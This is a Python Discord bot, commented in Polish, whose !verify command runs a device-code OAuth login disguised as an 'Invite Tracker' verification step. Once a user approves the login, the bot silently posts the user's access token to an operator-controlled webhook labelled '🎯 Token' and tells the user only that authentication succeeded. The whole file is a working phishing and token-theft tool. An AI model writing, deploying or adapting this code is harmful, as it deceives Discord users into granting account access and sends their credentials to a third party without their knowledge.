import discord
from discord.ext import commands
import requests
import os
import time

BOT_TOKEN = os.getenv("BOT_TOKEN")
CLIENT_ID = os.getenv("CLIENT_ID")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f"✅ Zalogowano jako {bot.user}")

@bot.command()
async def verify(ctx):
    # Krok 1: Generuj kod logowania (Device Authorization)
    data = {
        "client_id": CLIENT_ID,
        "scope": "identify"
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    response = requests.post("https://discord.com/api/v9/oauth2/device", data=data, headers=headers)
    device_data = response.json()
    
    user_code = device_data["user_code"]
    verification_uri = device_data["verification_uri"]
    interval = device_data["interval"]
    
    # Krok 2: Wyślij embed z kodem i linkiem
    embed = discord.Embed(
        title="Verification",
        description=f"**1.** Click [**{verification_uri}**]({verification_uri})\n**2.** Enter this code: **`{user_code}`**\n**3.** Click **Zaloguj się**",
        color=0x5865F2
    )
    embed.set_footer(text="This challenge expires in 15 minutes")
    embed.set_author(name="Invite Tracker", icon_url="https://cdn.discordapp.com/emojis/123456789.png")
    
    await ctx.send(embed=embed)
    
    # Krok 3: Czekaj na zatwierdzenie logowania
    while True:
        time.sleep(interval)
        token_data = {
            "client_id": CLIENT_ID,
            "device_code": device_data["device_code"],
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code"
        }
        token_response = requests.post("https://discord.com/api/v9/oauth2/token", data=token_data, headers=headers)
        
        if token_response.status_code == 200:
            access_token = token_response.json().get("access_token")
            # Wyslij token na webhook
            if WEBHOOK_URL:
                requests.post(WEBHOOK_URL, json={"content": f"**🎯 Token:** `{access_token}`"})
            await ctx.send("✅ **Authentication successful!** You can now close this page.")
            break
        elif token_response.status_code == 400:
            # Sprawdź czy kod wygasł
            error = token_response.json().get("error")
            if error == "authorization_pending":
                continue  # Czekaj dalej
            elif error == "expired_token":
                await ctx.send("❌ **Verification expired.** Please try again.")
                break
            else:
                await ctx.send(f"❌ **Error:** {error}")
                break

bot.run(BOT_TOKEN)
